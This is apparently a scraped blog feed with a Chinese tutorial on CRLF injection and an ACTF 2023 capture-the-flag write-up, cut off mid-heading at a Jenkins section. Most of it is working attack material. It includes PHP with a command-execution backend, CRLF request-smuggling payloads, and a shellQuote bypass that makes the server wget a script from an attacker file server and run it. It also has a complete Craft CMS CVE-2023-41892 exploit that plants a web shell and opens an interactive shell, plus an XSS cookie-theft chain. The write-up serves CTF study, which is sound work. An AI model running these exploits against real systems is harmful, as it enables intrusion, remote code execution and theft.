通过不断在页面进行弹窗使得页面超时从而得到 flag</p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRLF 注入</title>
      <link href="/skill/crlf-%E6%B3%A8%E5%85%A5/"/>
      <url>/skill/crlf-%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="1-注入-HTTP-头"><a href="#1-注入-HTTP-头" class="headerlink" title="1. 注入 HTTP 头"></a>1. 注入 HTTP 头</h2><p>CRLF 指的是回⻋符和换⾏符 <code>\r\n</code>, HTTP 数据包中的每⼀⾏都会使⽤ CRLF 作为分隔符, 其中 Header 每⾏使⽤⼀个 CRLF 分隔, Header 和 Body 之间使⽤两个CRLF 分隔</p><p>在某些情况下, 如果我们能够控制 HTTP 数据包中的某些字段, 并且可以注⼊ CRLF 字符, 那么我们就可以构造出其它的 HTTP 头, 甚⾄是注⼊⼀个完整的 HTTP 请求、</p><p>eg.</p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"http://127.0.0.1/backend.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_COOKIE</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uid="</span><span class="token operator">.</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token delimiter important">?></span></span></code></pre><p>backend.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">!==</span> <span class="token string single-quoted-string">'localhost'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'::1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No cookie'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your uid is: '</span><span class="token operator">.</span><span class="token variable">$uid</span><span class="token punctuation">;</span><span class="token comment">// only for local test</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>backend.php 会通过 HTTP Header 中 Filename 的值读取⽂件, 但是限制了只能通过本地 IP 访问</p><p>index.php 会通过 curl 系列函数向 backend.php 发送请求, 并且携带⼀个 uid cookie</p><p>根据参考⽂章, 这⾥ curl 配置的参数 CURLOPT_COOKIE 并不会忽略 CRLF 字符, 因此我们可以在 uid 这个 cookie 中注⼊ CRLF 字符, 然后构造⼀个新的 HTTP 头, 最终读取 flag</p><p>http 包：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1:10800Cookie: uid&#x3D;651fe17d4a83d%0d%0aFilename: &#x2F;flagConnection: close</code></pre><h2 id="2-注入完整-HTTP-请求"><a href="#2-注入完整-HTTP-请求" class="headerlink" title="2. 注入完整 HTTP 请求"></a>2. 注入完整 HTTP 请求</h2><p>CRLF 注⼊除了能够构造⼀个新的 HTTP 头, 在某些情况下还能够构造出⼀个完整的 HTTP 请求</p><p>eg.</p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"http://127.0.0.1/backend.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_COOKIE</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uid="</span><span class="token operator">.</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>backend.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'localhost'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'::1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No cookie'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your uid is: '</span><span class="token operator">.</span><span class="token variable">$uid</span><span class="token punctuation">;</span><span class="token comment">// only for local test</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>backend.php 会接受 POST 传递的 cmd 并作为命令执⾏, 但是限制了只能通过本地 IP 访问</p><p>index.php 会通过 curl 系列函数向 backend.php 发送 GET 请求, 并且携带⼀个 uid cookie</p><p>根据参考⽂章, 这⾥ curl 配置的参数 CURLOPT_COOKIE 并不会忽略 CRLF 字符, 因此我们可以在 uid 这个 cookie 中注⼊ CRLF 字符, 然后构造⼀个完整的 HTTP 请求,最终实现 RCE 读取 flag</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotedata <span class="token operator">=</span> <span class="token triple-quoted-string string">'''cmd=cp /flag /var/www/html/flag.txt'''</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /backend.php HTTP/1.1Host: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedCookie: uid=evilContent-Length: &#123;&#125;&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>payload：</p><pre class="language-none"><code class="language-none">%0D%0A%0D%0APOST%20&#x2F;backend.php%20HTTP&#x2F;1.1%0D%0AHost%3A%20127.0.0.1%0D%0AConnection%3A%20close%0D%0AContent-Type%3A%20application&#x2F;x-www-form-urlencoded%0D%0ACookie%3A%20uid%3Devil%0D%0AContent-Length%3A%2035%0D%0A%0D%0Acmd%3Dcp%20&#x2F;flag%20&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt</code></pre><p>http 包：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1:10800Cookie:uid&#x3D;123%0D%0A%0D%0APOST%20&#x2F;backend.php%20HTTP&#x2F;1.1%0D%0AHost%3A%20127.0.0.1%0D%0AConnection%3A%20close%0D%0AContent-Type%3A%20application&#x2F;x-www-form-urlencoded%0D%0ACookie%3A%20uid%3Devil%0D%0AContent-Length%3A%2035%0D%0A%0D%0Acmd%3Dcp%20&#x2F;flag%20&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txtConnection: close</code></pre><p>需要注意构造出来的新的 http 请求并不会有任何回显, 但是实际上命令已经成功执⾏, 因此这⾥选择将 flag 复制到 web ⽬录下，访问 flag.txt 查看 flag</p>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRLF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 ACTF WriteUp</title>
      <link href="/write-up/2023-actf-writeup/"/>
      <url>/write-up/2023-actf-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="Ave Mujica’s Masquerade"></a>Ave Mujica’s Masquerade</h1><p>CVE-2021-42740</p><pre class="language-none"><code class="language-none">return String(s).replace(&#x2F;([A-z]:)?([#!&quot;$&amp;&#39;()*,:;&lt;&#x3D;&gt;?@\[\\\]^&#96;&#123;|&#125;])&#x2F;g, &#39;$1\\$2&#39;);</code></pre><p>利用 A-z 之间的特殊符号 <code>:`something`:</code> 实现 RCE</p><p>shellQuote 添加的转义符会被两层反引号恢复（部分特殊符号会失效，需绕开）</p><p>payload.sh</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> /flag*<span class="token variable">`</span></span> public/s3ven.txt</code></pre><p>wget 把 payload.sh 写到目录下</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token operator">&lt;</span>file_server_ip<span class="token operator">></span>/payload.sh <span class="token parameter variable">-O</span> payload.sh</code></pre><p>绕过shellQuote</p><pre class="language-bash" data-language="bash"><code class="language-bash">GET /checker?url%3d%3a%60%3a%60wget%24IFS%5chttps%3a%2f%2f%3cfile_server_ip%3e%2fpayload.sh%24IFS%5c-O%24IFS%5cpayload.sh%60%60%3a%23 HTTP/1.1</code></pre><p>chmod 给权限</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> payload.sh</code></pre><p>绕过shellQuote</p><pre class="language-bash" data-language="bash"><code class="language-bash">GET /checker?url<span class="token operator">=</span>%3a%60%3a%60chmod%24IFS%5c777%24IFS%5cpayload.sh%60%60%3a%23 HTTP/1.1</code></pre><p>执行 sh</p><pre class="language-bash" data-language="bash"><code class="language-bash">./payload.sh</code></pre><p>绕过shellQuote</p><pre class="language-bash" data-language="bash"><code class="language-bash">GET /checker?url<span class="token operator">=</span>%3a%60%3a%60.%2fpayload.sh%60%60%3a%23 HTTP/1.1</code></pre><p>访问 &#x2F;s3ven.txt 即可获得 flag</p><h1 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h1><p>CVE-2023-41892</p><p>先用 <code>Imagick vid:msl</code> 协议写入 shell</p><p>再用 <code>PhpManager.php</code> 包含 shell 实现 RCE</p><p>浅改一下网上的POC，然后用 python 一把梭</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> sysheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">writePayloadToFile</span><span class="token punctuation">(</span>tmpDir<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"conditions/render"</span><span class="token punctuation">,</span>        <span class="token string">"configObject"</span><span class="token punctuation">:</span> <span class="token string">"craft\elements\conditions\ElementCondition"</span><span class="token punctuation">,</span>        <span class="token string">"config"</span><span class="token punctuation">:</span> <span class="token string">'&#123;"name":"configObject","as ":&#123;"class":"Imagick", "__construct()":&#123;"files":"vid:msl:/tmp/php*"&#125;&#125;&#125;'</span>    <span class="token punctuation">&#125;</span>    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"image1"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"poc.msl"</span><span class="token punctuation">,</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="UTF-8"?>        &lt;image>        &lt;read filename="caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;"/>        &lt;write filename="info:TEMPDIR/shell.php">        &lt;/image>"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"TEMPDIR"</span><span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getTmpUploadDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"conditions/render"</span><span class="token punctuation">,</span>        <span class="token string">"configObject"</span><span class="token punctuation">:</span> <span class="token string">"craft\elements\conditions\ElementCondition"</span><span class="token punctuation">,</span>        <span class="token string">"config"</span><span class="token punctuation">:</span> <span class="token string">r'&#123;"name":"configObject","as ":&#123;"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":&#123;"methods":&#123;"close":"phpinfo"&#125;&#125;&#125;&#125;'</span>    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    pattern1 <span class="token operator">=</span> <span class="token string">r'&lt;tr>&lt;td class="e">upload_tmp_dir&lt;\/td>&lt;td class="v">(.*?)&lt;\/td>&lt;td class="v">(.*?)&lt;\/td>&lt;\/tr>'</span>       <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern1<span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"conditions/render"</span><span class="token punctuation">,</span>        <span class="token string">"configObject"</span><span class="token punctuation">:</span> <span class="token string">"craft\elements\conditions\ElementCondition"</span><span class="token punctuation">,</span>        <span class="token string">"config"</span><span class="token punctuation">:</span> <span class="token string">r'&#123;"name":"configObject","as ":&#123;"class":"\\yii\\rbac\\PhpManager","__construct()":[&#123;"itemFile":"TEMPDIR/shell.php"&#125;]&#125;&#125;'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"TEMPDIR"</span><span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"cmd"</span><span class="token punctuation">:</span> cmd    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'caption:(.*?)CAPTION'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        extracted_text <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>extracted_text<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">return</span> extracted_text<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python CVE-2023-41892.py &lt;url>"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Get temporary folder ..."</span><span class="token punctuation">)</span>        upload_tmp_dir <span class="token operator">=</span> getTmpUploadDir<span class="token punctuation">(</span><span class="token punctuation">)</span>        tmpDir <span class="token operator">=</span> <span class="token string">"/tmp"</span> <span class="token keyword">if</span> upload_tmp_dir <span class="token operator">==</span> <span class="token string">"&lt;i>no value&lt;/i>"</span> <span class="token keyword">else</span> upload_tmp_dir        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Write payload to file ..."</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            writePayloadToFile<span class="token punctuation">(</span>tmpDir<span class="token punctuation">)</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Crash the php process and write temp file successfully"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Done, enjoy the shell"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span>            shell<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span></code></pre><h1 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h1><p><code>URL</code> 类可以控制参数生成任意地址，</p><p>路径字符串拼接可以控制参数生成任意同源地址</p><p>通过相对路径让bot访问 <code>/preview</code>，绕过 VIP 和 CSP 限制</p><p>XSS通过 <code>latex.js</code> 的 <code>baseURL</code> 实现</p><p>关于 <code>HttpOnly</code> 的绕过，构造特定 token，通过 XSS 访问 <code>/vip</code> 路由，让服务端送出Cookie</p><hr><p>登录拿token</p><pre class="language-none"><code class="language-none">username: &#x2F;&#x2F;&lt;host&gt;:&lt;listen_port&gt;password: md5(username)</code></pre><hr><p>XSS脚本</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'token=&lt;token>; expires=Sun, 1 Jan 2024 00:00:00 UTC; path=/'</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'same-origin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><p>在 server 上开两个端口，分别用于 listen 和 fileserver，仿照 theme 目录结构，访问<code>/share</code> 路由唤起 bot</p><pre class="language-none"><code class="language-none">&#x2F;share&#x2F;..%2fpreview%3ftheme%3d%2f%2f&lt;host&gt;:&lt;fileserver_port&gt;&amp;tex&#x3D;111</code></pre><p>这里 POST 给 <code>/vip</code> 的地址访问不了的话能直接炸靶机</p><h1 id="hooks"><a href="#hooks" class="headerlink" title="hooks"></a>hooks</h1><p>本题主要是利用 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861">CVE-2018-1000861</a> 实现 <code>Jenkins远程命令执行</code></p><p>实现原理：</p><blockquote><p>Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。</p></blockquote><blockquote><p>通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p></blockquote><h2 id="1-请求方式更改"><a href="#1-请求方式更改" class="headerlink" title="1. 请求方式更改"></a>1. 